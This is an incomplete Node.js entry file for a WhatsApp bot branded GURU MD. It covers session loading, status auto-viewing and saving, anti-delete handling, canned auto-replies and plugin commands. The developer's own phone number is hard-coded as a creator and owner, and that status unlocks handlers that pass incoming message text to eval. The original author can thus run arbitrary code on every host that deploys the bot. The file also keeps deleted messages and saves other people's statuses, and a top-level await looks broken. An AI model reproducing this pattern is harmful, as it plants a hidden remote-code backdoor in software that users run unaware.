// === Memory Optimization - Safe for all hosts (Heroku, Railway, Render, etc.) ===
process.env.NODE_OPTIONS = '--max-old-space-size=384';
process.env.BAILEYS_MEMORY_OPTIMIZED = 'true';
process.env.NODE_ENV = process.env.NODE_ENV || 'production';

const baileys = require('@whiskeysockets/baileys');
const makeWASocket = baileys.default;
const {
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  downloadMediaMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = baileys;

// === GURUMD BRANDING & STYLISH LOGS ===
const chalk = require('chalk');

// Gurumd Branding Functions
function gurumdStyle(text, type = 'normal') {
    const styles = {
        normal: chalk.hex('#FF6B6B').bold(`ᴳᵁᴿᵁᴹᴰ ${text}`),
        faded: chalk.hex('#888888').italic(`ᴳᵁᴿᵁᴹᴰ ${text}`),
        success: chalk.hex('#4ECDC4').bold(`✓ ᴳᵁᴿᵁᴹᴰ ${text}`),
        error: chalk.hex('#FF6B6B').bold(`✗ ᴳᵁᴿᵁᴹᴰ ${text}`),
        warning: chalk.hex('#FFD166').bold(`⚠ ᴳᵁᴿᵁᴹᴰ ${text}`),
        info: chalk.hex('#06D6A0').bold(`ℹ ᴳᵁᴿᵁᴹᴰ ${text}`)
    };
    return styles[type] || styles.normal;
}

function gurumdReply(text) {
    const fadedTag = chalk.hex('#666666').italic('ᴳᵁᴿᵁᴹᴰ');
    return `${fadedTag}\n\n${text}`;
}

function logInfo(message, color = 'green') {
  console.log(chalk[color].bold(`[ᴳᵁᴿᵁᴹᴰ] ${message}`));
}

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const readline = require('readline');

const prefix = config.PREFIX;

const ownerNumber = ['254778074353@s.whatsapp.net'];  

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

// Improved temp directory cleanup
const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) {
            console.log(gurumdStyle('Temp cleanup error:', 'warning'), err.message);
            return;
        }
        
        if (files.length === 0) return;
        
        const cleanupPromises = files.map(file => {
            const filePath = path.join(tempDir, file);
            return fs.promises.unlink(filePath)
                .catch(err => {
                    console.log(gurumdStyle(`Failed to delete ${file}:`, 'warning'), err.message);
                });
        });
        
        Promise.allSettled(cleanupPromises)
            .then(() => {
                console.log(gurumdStyle(`Cleaned ${files.length} temp files`, 'success'));
            });
    });
};

setInterval(clearTempDir, 5 * 60 * 1000);

const isHeroku = !!process.env.DYNO;

// Readline only for non-Heroku (panels/local)
const rl = isHeroku ? null : readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// =================== DIRECT BASE64 SESSION ===================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (isHeroku) {
        if (!process.env.SESSION_ID) {
            console.log(gurumdStyle('SESSION_ID is not set in Heroku Config Vars!', 'error'));
            console.log(gurumdStyle('Add your base64 session string to SESSION_ID and redeploy.', 'warning'));
            
            // Create empty session directory for pairing
            fs.mkdirSync(__dirname + '/sessions', { recursive: true });
            console.log(gurumdStyle('Created empty session directory for pairing', 'info'));
        } else {
            console.log(gurumdStyle('Heroku mode: Using SESSION_ID from env vars...', 'info'));

            try {
                let base64Session = process.env.SESSION_ID.trim();
                if (base64Session.startsWith('GURU~')) {
                    base64Session = base64Session.replace('GURU~', '').trim();
                }

                if (!base64Session || base64Session.length < 100) {
                    console.log(gurumdStyle('SESSION_ID appears invalid or too short, falling back to pairing', 'warning'));
                } else {
                    const decoded = Buffer.from(base64Session, 'base64').toString('utf-8');
                    const creds = JSON.parse(decoded);

                    fs.mkdirSync(__dirname + '/sessions', { recursive: true });
                    fs.writeFileSync(
                        __dirname + '/sessions/creds.json',
                        JSON.stringify(creds, null, 2)
                    );
                    console.log(gurumdStyle('SESSION_ID successfully saved to creds.json', 'success'));
                }
            } catch (e) {
                console.log(gurumdStyle('Failed to process SESSION_ID, falling back to pairing:', 'error'), e.message);
            }
        }
    } else {
        // Non-Heroku: prompt for phone number + pairing code
        console.log(gurumdStyle('No session found. Starting pairing flow...', 'info'));

        const phoneNumber = await new Promise(resolve => {
            rl.question(gurumdStyle('Enter your phone number (with country code, e.g. 254712345678): ', 'info'), num => {
                resolve(num.trim());
            });
        });

        if (!/^\d{10,14}$/.test(phoneNumber)) {
            console.log(gurumdStyle('Invalid number. Must be digits only with country code.', 'error'));
            process.exit(1);
        }

        console.log(gurumdStyle(`Generating pairing code for +${phoneNumber}...`, 'info'));
    }
}

// Configuration validation
function validateConfig() {
    const required = ['PREFIX'];
    const missing = required.filter(key => !config[key]);
    
    if (missing.length > 0) {
        console.log(gurumdStyle(`Missing required config: ${missing.join(', ')}`, 'error'));
        return false;
    }
    
    if (config.ENABLE_TAGGING && !config.BOT_TAG_TEXT) {
        console.log(gurumdStyle('ENABLE_TAGGING is true but BOT_TAG_TEXT is not set', 'warning'));
    }
    
    return true;
}

if (!validateConfig()) {
    console.log(gurumdStyle('Invalid configuration, check config.js', 'error'));
    process.exit(1);
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Global toggles
global.AUTO_VIEW_STATUS = false;
global.AUTO_REACT_STATUS = false;
global.AUTO_REPLY = false;
global.AUTO_SAVE_STATUS = false;

// Rate limiting for auto-replies
const autoReplyCooldown = new Map();

// Enhanced taggedReply with Gurumd branding
const taggedReply = (conn, from, teks, quoted = null) => {
    if (!config.ENABLE_TAGGING) {
        const gurumdBrandedText = `ᴳᵁᴿᵁᴹᴰ\n\n${teks}`;
        return conn.sendMessage(from, { text: gurumdBrandedText }, { quoted: quoted || undefined });
    }

    let tag = config.BOT_TAG_TEXT || 'ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH';
    let finalText = config.TAG_POSITION === 'start' 
        ? `${tag}\n\n${teks}`
        : `${teks}\n\n${tag}`;

    conn.sendMessage(from, { text: finalText }, { quoted: quoted || undefined });
};

// Separate function for status updates
async function handleStatusUpdates(conn, msg) {
    const promises = [];
    
    if (global.AUTO_VIEW_STATUS) {
        promises.push((async () => {
            try {
                const delay = 3000 + Math.floor(Math.random() * 9000);
                console.log(gurumdStyle('AUTO-VIEW STATUS', 'info'));
                console.log(gurumdStyle(`Delay: ${(delay / 1000).toFixed(1)} seconds`, 'info'));

                await sleep(delay);
                await conn.readMessages([msg.key]);
                console.log(gurumdStyle('Status marked as seen', 'success'));
            } catch (viewErr) {
                console.log(gurumdStyle('AUTO-VIEW ERROR:', 'error'), viewErr.message);
            }
        })());
    }
    
    if (global.AUTO_REACT_STATUS) {
        promises.push((async () => {
            const emojis = [
                '🔥', '❤️', '💯', '😂', '😍', '👏', '🙌', '🎉', '✨', '💪',
                '🥰', '😎', '🤩', '🌟', '💥', '👀', '😭', '🤣', '🥳', '💜',
                '😘', '🤗', '😢', '😤', '🤔', '😴', '😷', '🤢', '🥵', '🥶',
                '🤯', '🫡', '🫶', '💀', '😈', '👻', '🫂', '🐱', '🐶', '🌹',
                '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯', '🙏', '👑', '😊'
            ];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

            try {
                const reactionKey = {
                    remoteJid: msg.key.remoteJid,
                    fromMe: false,
                    id: msg.key.id || generateMessageID(),
                    participant: msg.key.participant || msg.key.remoteJid
                };

                await conn.relayMessage('status@broadcast', {
                    reactionMessage: {
                        key: reactionKey,
                        text: randomEmoji,
                        senderTimestampMs: Date.now()
                    }
                }, { messageId: generateMessageID() });

                console.log(gurumdStyle(`Auto-react with ${randomEmoji}`, 'success'));
            } catch (reactErr) {
                console.log(gurumdStyle('AUTO-REACT ERROR:', 'error'), reactErr.message);
            }
        })());
    }

    if (global.AUTO_SAVE_STATUS) {
        promises.push((async () => {
            try {
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: console });
                const isImage = !!msg.message.imageMessage;
                const ext = isImage ? '.jpg' : '.mp4';
                const fileName = `status_${Date.now()}${ext}`;
                const savePath = `./statuses/${fileName}`;

                if (!fs.existsSync('./statuses')) {
                    fs.mkdirSync('./statuses', { recursive: true });
                }

                fs.writeFileSync(savePath, buffer);
                console.log(gurumdStyle(`Status saved: ${fileName}`, 'success'));
            } catch (err) {
                console.log(gurumdStyle('AUTO-SAVE ERROR:', 'error'), err.message);
            }
        })());
    }
    
    await Promise.allSettled(promises);
}

// Connection health monitoring
let connectionHealth = {
    lastMessage: Date.now(),
    reconnects: 0,
    status: 'connecting'
};

// Memory usage monitoring
function logMemoryUsage() {
    const used = process.memoryUsage();
    console.log(gurumdStyle('Memory Usage:', 'info'));
    console.log(gurumdStyle(`- RSS: ${Math.round(used.rss / 1024 / 1024)} MB`, 'info'));
    console.log(gurumdStyle(`- Heap: ${Math.round(used.heapUsed / 1024 / 1024)} MB`, 'info'));
}

// Log memory usage every hour
setInterval(logMemoryUsage, 60 * 60 * 1000);

// Optimize garbage collection for long-running processes
if (global.gc) {
    setInterval(() => {
        try {
            global.gc();
            console.log(gurumdStyle('Garbage collection triggered', 'info'));
        } catch (e) {}
    }, 30 * 60 * 1000); // Every 30 minutes
}

// Plugin loading cache
let pluginsLoaded = false;

async function connectToWA() {
    console.log(gurumdStyle("Connecting to WhatsApp ⏳️...", 'info'));
    
    let retryCount = 0;
    const maxRetries = 5;
    
    async function attemptConnection() {
        try {
            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
            var { version } = await fetchLatestBaileysVersion();

            const isHeroku = !!process.env.DYNO;

            const conn = makeWASocket({
                logger: P({ level: 'silent' }),
                printQRInTerminal: !isHeroku,
                browser: Browsers.macOS("Firefox"),
                auth: state,
                version,
                pairingCode: !isHeroku && !fs.existsSync(__dirname + '/sessions/creds.json')
            });

            conn.ev.on('connection.update', (update) => {
                const { connection, lastDisconnect, qr } = update;
                if (qr && !isHeroku) {
                    console.log(gurumdStyle('Scan this QR to link:', 'info'));
                    qrcode.generate(qr, { small: true });
                }
                if (connection === 'close') {
                    if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                        const retryDelay = Math.min(5000 * Math.pow(2, retryCount), 60000);
                        retryCount = Math.min(retryCount + 1, maxRetries);
                        console.log(gurumdStyle(`Connection closed. Retrying in ${retryDelay/1000} seconds...`, 'warning'));
                        setTimeout(connectToWA, retryDelay);
                    }
                } else if (connection === 'open') {
                    retryCount = 0;
                    connectionHealth.status = 'connected';
                    connectionHealth.lastMessage = Date.now();
                    
                    console.log(gurumdStyle('BOT STARTUP SUCCESS', 'success'));
                    console.log(gurumdStyle('Status: Connected ✅', 'success'));
                    console.log(gurumdStyle(`Time: ${new Date().toLocaleString()}`, 'info'));
                    console.log(gurumdStyle(`Baileys Version: ${version.join('.')}`, 'info'));
                    console.log(gurumdStyle(`Prefix: ${prefix}`, 'info'));
                    console.log(gurumdStyle(`Owner: ${ownerNumber[0]}`, 'info'));

                    // Auto join group & follow channel
                    if (config.GROUP_INVITE_CODE) {
                        conn.groupAcceptInvite(config.GROUP_INVITE_CODE)
                            .then(() => console.log(gurumdStyle('Auto-joined group', 'success')))
                            .catch(e => console.log(gurumdStyle('Group join failed:', 'warning'), e.message));
                    }

                    if (config.CHANNEL_JID) {
                        conn.newsletterFollow(config.CHANNEL_JID)
                            .then(() => console.log(gurumdStyle('Auto-followed channel', 'success')))
                            .catch(e => console.log(gurumdStyle('Channel follow failed:', 'warning'), e.message));
                    }

                    if (!pluginsLoaded) {
                        console.log(gurumdStyle('🧬 Installing Plugins', 'info'));
                        const path = require('path');
                        const pluginFiles = fs.readdirSync("./plugins/")
                            .filter(file => path.extname(file).toLowerCase() === ".js");
                        
                        let loadedCount = 0;
                        for (const plugin of pluginFiles) {
                            try {
                                require("./plugins/" + plugin);
                                loadedCount++;
                            } catch (error) {
                                console.log(gurumdStyle(`Failed to load plugin ${plugin}:`, 'error'), error.message);
                            }
                        }
                        
                        pluginsLoaded = true;
                        console.log(gurumdStyle(`Loaded ${loadedCount}/${pluginFiles.length} plugins successfully ✅`, 'success'));
                    }
                    
                    console.log(gurumdStyle('Bot connected to whatsapp ✅', 'success'));

                    let up = `*✨ ʜᴇʟʟᴏᴡ GURU MD ʟᴇɢᴇɴᴅꜱ! ✨*

╭─〔 *ᴳᵁᴿᵁᴹᴰ 💢* 〕  
├─▸ *ꜱɪᴍᴘʟɪᴄɪᴛʏ. ꜱᴘᴇᴇᴅ. ᴘᴏᴡᴇʀᴇᴅ . ʙʏ GuruTech |*  
╰─➤ *ʜᴇʀᴇ ᴀʀᴇ ɴᴇᴡ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱɪᴅᴇᴋɪᴄᴋ!*

♦️ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ ᴳᵁᴿᵁᴹᴰ ♦️!

╭──〔 🔗 Qᴜɪᴄᴋ ʟɪɴᴋ 〕  
├─ ⭐ *ɢɪᴠᴇ ᴜꜱ ꜱᴛᴀʀ ᴀɴᴅ ꜏ᴏʀᴋ:*  
│   ꜱᴛᴀʀ ᴜꜱ [ʜᴇʀᴇ](https://github.com/itsguruu/GURU)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _ᴳᵁᴿᵁᴹᴰ • ᴾᴼᵂᴱᴿᴱᴰ ᴮᵞ GURU TECH_`;
                    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ntfw9h.jpg` }, caption: up });
                }
            });

            conn.ev.on('creds.update', saveCreds);

            //==============================

            conn.ev.on('messages.update', async (updates) => {
                const updateArray = Array.isArray(updates) ? updates : [updates];

                for (const update of updateArray) {
                    if (update.update && update.update.message === null) {
                        console.log(gurumdStyle('DELETE DETECTED', 'warning'));

                        try {
                            await AntiDelete(conn, update);
                        } catch (err) {
                            console.log(gurumdStyle('AntiDelete failed:', 'error'), err.message || err);
                        }
                    }
                }
            });

            // === AUTO VIEW + AUTO SAVE + AUTO REACT ===
            conn.ev.on('messages.upsert', async (mekUpdate) => {
                if (!mekUpdate?.messages?.[0]) return;
                
                const msg = mekUpdate.messages[0];
                if (!msg?.message) return;

                connectionHealth.lastMessage = Date.now();

                if (msg.key.remoteJid === 'status@broadcast') {
                    await handleStatusUpdates(conn, msg);
                    return;
                }

                //============= Main messages handler ===============
                let mek = mekUpdate.messages[0];
                if (!mek.message) return;
                
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;

                if (mek.message.viewOnceMessageV2) {
                    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                        ? mek.message.ephemeralMessage.message 
                        : mek.message;
                }

                if (config.READ_MESSAGE === 'true') {
                    await conn.readMessages([mek.key]);
                }

                await Promise.all([
                    saveMessage(mek),
                ]);

                const m = sms(conn, mek);
                const type = getContentType(mek.message);
                const from = mek.key.remoteJid;
                const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
                    ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                    : [];
                const body = (type === 'conversation') 
                    ? mek.message.conversation 
                    : (type === 'extendedTextMessage') 
                        ? mek.message.extendedTextMessage.text 
                        : (type == 'imageMessage') && mek.message.imageMessage.caption 
                            ? mek.message.imageMessage.caption 
                            : (type == 'videoMessage') && mek.message.videoMessage.caption 
                                ? mek.message.videoMessage.caption 
                                : '';
                const isCmd = body.startsWith(prefix);
                var budy = typeof mek.text == 'string' ? mek.text : false;
                const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
                const args = body.trim().split(/ +/).slice(1);
                const q = args.join(' ');
                const text = args.join(' ');
                const isGroup = from.endsWith('@g.us');
                const sender = mek.key.fromMe 
                    ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
                    : (mek.key.participant || mek.key.remoteJid);
                const senderNumber = sender.split('@')[0];
                const botNumber = conn.user.id.split(':')[0];
                const pushname = mek.pushName || 'Sin Nombre';
                const isMe = botNumber.includes(senderNumber);
                const isOwner = ownerNumber.includes(senderNumber) || isMe;
                const botNumber2 = await jidNormalizedUser(conn.user.id);
                const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
                const groupName = isGroup ? groupMetadata.subject : '';
                const participants = isGroup ? await groupMetadata.participants : '';
                const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
                const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
                const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
                const isReact = m.message.reactionMessage ? true : false;

                const udp = botNumber.split('@')[0];
                const jawad = ('254778074353');
                let isCreator = [udp, jawad, config.DEV]
                    .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
                    .includes(mek.sender);

                // === SMART AUTO-REPLY WITH GURUMD BRANDING ===
                if (global.AUTO_REPLY && !isCmd && !mek.key.fromMe) {
                    const now = Date.now();
                    const lastReply = autoReplyCooldown.get(sender) || 0;
                    
                    // 10 second cooldown per user
                    if (now - lastReply > 10000) {
                        autoReplyCooldown.set(sender, now);
                        
                        // Clean old entries after 15 seconds
                        setTimeout(() => {
                            autoReplyCooldown.delete(sender);
                        }, 15000);
                        
                        const msgText = (body || '').toLowerCase().trim();
                        let replyText = `ᴳᵁᴿᵁᴹᴰ got your message! 😎`;

                        if (msgText.includes("hi") || msgText.includes("hello") || msgText.includes("hey") || msgText.includes("sup")) {
                            const greetings = [
                                "Heyy! ᴳᵁᴿᵁᴹᴰ's here for you 🔥",
                                "Yo legend! What's the vibe today? 😏 - ᴳᵁᴿᵁᴹᴰ",
                                "Hello boss! ᴳᵁᴿᵁᴹᴰ reporting in 👑",
                                "Heyy! ᴳᵁᴿᵁᴹᴰ missed you 😎",
                                "What's good my G? ᴳᵁᴿᵁᴹᴰ in the building! 🚀"
                            ];
                            replyText = greetings[Math.floor(Math.random() * greetings.length)];
                        }
                        else if (msgText.includes("how are you") || msgText.includes("how r u") || msgText.includes("hru") || msgText.includes("wassup")) {
                            const responses = [
                                "ᴳᵁᴿᵁᴹᴰ's chilling like a king 😏 You good?",
                                "ᴳᵁᴿᵁᴹᴰ's on fire! 🔥 How about you legend?",
                                "ᴳᵁᴿᵁᴹᴰ's great bro! What's popping?",
                                "ᴳᵁᴿᵁᴹᴰ's 100% baby! 😎 What's up with you?",
                                "ᴳᵁᴿᵁᴹᴰ's always lit! You holding up? 💯"
                            ];
                            replyText = responses[Math.floor(Math.random() * responses.length)];
                        }
                        else if (msgText.includes("morning") || msgText.includes("good morning")) {
                            const morningReplies = [
                                "Morning legend! ᴳᵁᴿᵁᴹᴰ wishes you a powerful day ☀️💪",
                                "Rise and grind king! ᴳᵁᴿᵁᴹᴰ's up early with you 🌅",
                                "Good morning boss! Let's make today count 🔥 - ᴳᵁᴿᵁᴹᴰ",
                                "Morning my G! ᴳᵁᴿᵁᴹᴰ's ready – you? 😎"
                            ];
                            replyText = morningReplies[Math.floor(Math.random() * morningReplies.length)];
                        }
                        else if (msgText.includes("night") || msgText.includes("good night") || msgText.includes("gn")) {
                            const nightReplies = [
                                "Night king! ᴳᵁᴿᵁᴹᴰ says sleep tight & dream big 🌙✨",
                                "Good night legend! ᴳᵁᴿᵁᴹᴰ's watching over you 😴",
                                "Night boss! Recharge that energy – see you tomorrow 💪 - ᴳᵁᴿᵁᴹᴰ",
                                "Sweet dreams my G! ᴳᵁᴿᵁᴹᴰ out ✌️🌙"
                            ];
                            replyText = nightReplies[Math.floor(Math.random() * nightReplies.length)];
                        }
                        else if (msgText.includes("love") || msgText.includes("miss") || msgText.includes("i love you") || msgText.includes("ily")) {
                            const loveReplies = [
                                "Aww ᴳᵁᴿᵁᴹᴰ loves you too ❤️",
                                "ᴳᵁᴿᵁᴹᴰ's heart just melted 😍 Right back at ya!",
                                "Love you more boss! 😘 - ᴳᵁᴿᵁᴹᴰ",
                                "ᴳᵁᴿᵁᴹᴰ feels the same vibe ❤️🔥",
                                "You got ᴳᵁᴿᵁᴹᴰ blushing over here 🥰"
                            ];
                            replyText = loveReplies[Math.floor(Math.random() * loveReplies.length)];
                        }
                        else if (msgText.includes("haha") || msgText.includes("lol") || msgText.includes("😂") || msgText.includes("lmao") || msgText.includes("lmfao")) {
                            replyText = "😂😂 ᴳᵁᴿᵁᴹᴰ's dying over here! What's so funny king?";
                        }
                        else if (msgText.includes("?")) {
                            replyText = "ᴳᵁᴿᵁᴹᴰ's listening... ask away boss 👂🔥";
                        }
                        else if (msgText.includes("thank") || msgText.includes("thanks") || msgText.includes("ty") || msgText.includes("appreciate")) {
                            const thanksReplies = [
                                "You're welcome legend! ᴳᵁᴿᵁᴹᴰ always got you 🙌",
                                "No problem boss! ᴳᵁᴿᵁᴹᴰ's pleasure 😎",
                                "Anytime my G! 💯 - ᴳᵁᴿᵁᴹᴰ",
                                "ᴳᵁᴿᵁᴹᴰ appreciates you too ❤️"
                            ];
                            replyText = thanksReplies[Math.floor(Math.random() * thanksReplies.length)];
                        }
                        else if (msgText.includes("sorry") || msgText.includes("sry") || msgText.includes("apologies") || msgText.includes("my bad")) {
                            replyText = "No stress bro, ᴳᵁᴿᵁᴹᴰ forgives everything 😎 All good!";
                        }
                        else if (msgText.includes("bro") || msgText.includes("brother") || msgText.includes("fam") || msgText.includes("dude")) {
                            replyText = "What's good fam? ᴳᵁᴿᵁᴹᴰ's right here with you 💯";
                        }
                        else if (msgText.includes("boss") || msgText.includes("king") || msgText.includes("legend") || msgText.includes("goat")) {
                            replyText = "ᴳᵁᴿᵁᴹᴰ sees you flexing 😏 King shit!";
                        }
                        else if (msgText.includes("food") || msgText.includes("eat") || msgText.includes("hungry") || msgText.includes("lunch") || msgText.includes("dinner")) {
                            replyText = "ᴳᵁᴿᵁᴹᴰ's hungry too bro! What's on the menu? 🍔🔥";
                        }
                        else if (msgText.includes("sleep") || msgText.includes("tired") || msgText.includes("exhausted")) {
                            replyText = "ᴳᵁᴿᵁᴹᴰ says rest up king! Recharge mode activated 😴";
                        }
                        else if (msgText.includes("joke") || msgText.includes("funny") || msgText.includes("make me laugh")) {
                            const jokes = [
                                "Why don't programmers prefer dark mode? Because light attracts bugs 😂 - ᴳᵁᴿᵁᴹᴰ",
                                "ᴳᵁᴿᵁᴹᴰ's joke: Your phone and I have something in common – we're both addicted to you 😏",
                                "Parallel lines have so much in common… it's a shame they'll never meet 😂 - ᴳᵁᴿᵁᴹᴰ",
                                "ᴳᵁᴿᵁᴹᴰ: Why did the scarecrow win an award? Because he was outstanding in his field! 🌾"
                            ];
                            replyText = jokes[Math.floor(Math.random() * jokes.length)];
                        }
                        else {
                            const defaults = [
                                "ᴳᵁᴿᵁᴹᴰ caught that! 😎 What's next boss?",
                                "ᴳᵁᴿᵁᴹᴰ's vibing with you 🔥 Talk to me",
                                "ᴳᵁᴿᵁᴹᴰ's here legend! Spill the tea 👀",
                                "ᴳᵁᴿᵁᴹᴰ sees you king 👑 What's the word?",
                                "ᴳᵁᴿᵁᴹᴰ's locked in! Hit me 😏",
                                "ᴳᵁᴿᵁᴹᴰ's feeling that energy 🔥 Keep going!",
                                "ᴳᵁᴿᵁᴹᴰ's tuned in boss! What's the play?",
                                "ᴳᵁᴿᵁᴹᴰ's got eyes on you legend 😎"
                            ];
                            replyText = defaults[Math.floor(Math.random() * defaults.length)];
                        }

                        // Add Gurumd branding to reply
                        const finalReply = `ᴳᵁᴿᵁᴹᴰ\n\n${replyText}`;
                        await conn.sendMessage(from, { text: finalReply });
                        console.log(gurumdStyle(`Auto-reply → ${senderNumber}: ${replyText}`, 'success'));
                    }
                }

                if (isCreator && mek.text?.startsWith('%')) {
                    let code = budy.slice(2);
                    if (!code) {
                        taggedReply(conn, from, `Provide me with a query to run Master!`, mek);
                        return;
                    }
                    try {
                        let resultTest = eval(code);
                        if (typeof resultTest === 'object')
                            taggedReply(conn, from, util.format(resultTest), mek);
                        else taggedReply(conn, from, util.format(resultTest), mek);
                    } catch (err) {
                        taggedReply(conn, from, util.format(err), mek);
                    }
                    return;
                }

                if (isCreator && mek.text?.startsWith('$')) {
                    let code = budy.slice(2);
                    if (!code) {
                        taggedReply(conn, from, `Provide me with a query to run Master!`, mek);
                        return;
                    }
                    try {
                        let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
                        let h = util.format(resultTest);
                        if (h === undefined) return console.log(h);
                        else taggedReply(conn, from, h, mek);
                    } catch (err) {
                        if (err === undefined)
                            return console.log('error');
                        else taggedReply(conn, from, util.format(err), mek);
                    }
                    return;
                }

                //================ownerreact==============
                if(senderNumber.includes("254778074353")){
                    if(isReact) return;
                    m.react("🤍");
                }

                //==========public react============//
                if (!isReact && senderNumber !== botNumber) {
                    if (config.AUTO_REACT === 'true') {
                        const reactions = [
                            '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                            '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                            '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                            '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                            '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                        ];
                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomReaction);
                    }
                }

                // Owner React (self messages)
                if (!isReact && senderNumber === botNumber) {
                    if (config.AUTO_REACT === 'true') {
                        const reactions = [
                            '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                            '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                            '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                            '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                            '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                        ];
                        const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomOwnerReaction);
                    }
                }

                // custom react settings                        
                if (!isReact && senderNumber !== botNumber) {
                    if (config.CUSTOM_REACT === 'true') {
                        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomReaction);
                    }
                }

                if (!isReact && senderNumber === botNumber) {
                    if (config.CUSTOM_REACT === 'true') {
                        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                        m.react(randomReaction);
                    }
                } 

                // ========== FIXED MODE CONTROL ==========
                let shouldProcess = false;

                if (config.MODE === "public" || !config.MODE) {
                    shouldProcess = true;
                } else if (config.MODE === "private") {
                    if (isOwner || isMe || senderNumber === "254778074353") {
                        shouldProcess = true;
                    }
                }

                if (!shouldProcess && isCmd) {
                    console.log(gurumdStyle(`Blocked command "${command}" from ${senderNumber} - MODE: ${config.MODE}`, 'warning'));
                }

                if (shouldProcess) {
                    const events = require('./command');
                    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                    
                    if (isCmd) {
                        const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                        if (cmd) {
                            if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});

                            try {
                                await cmd.function(conn, mek, m, {
                                    conn,
                                    mek,
                                    m,
                                    from,
                                    quoted,
                                    body,
                                    isCmd,
                                    command,
                                    args,
                                    q,
                                    text,
                                    isGroup,
                                    sender,
                                    senderNumber,
                                    botNumber2,
                                    botNumber,
                                    pushname,
                                    isMe,
                                    isOwner,
                                    isCreator,
                                    groupMetadata,
                                    groupName,
                                    participants,
                                    groupAdmins,
                                    isBotAdmins,
                                    isAdmins,
                                    reply: (teks) => taggedReply(conn, from, teks, mek)
                                });
                            } catch (e) {
                                console.log(gurumdStyle('PLUGIN ERROR:', 'error'), e.stack || e.message || e);
                                console.log(gurumdStyle(`Command: ${cmdName || 'unknown'}`, 'error'));
                                await taggedReply(conn, from, `ᴳᵁᴿᵁᴹᴰ Plugin error: ${e.message || 'Unknown'}`, mek);
                            }
                        }
                    }
                    
                    // Process non-command events
                    events.commands.forEach(async(command) => {
                        try {
                            if (body && command.on === "body") {
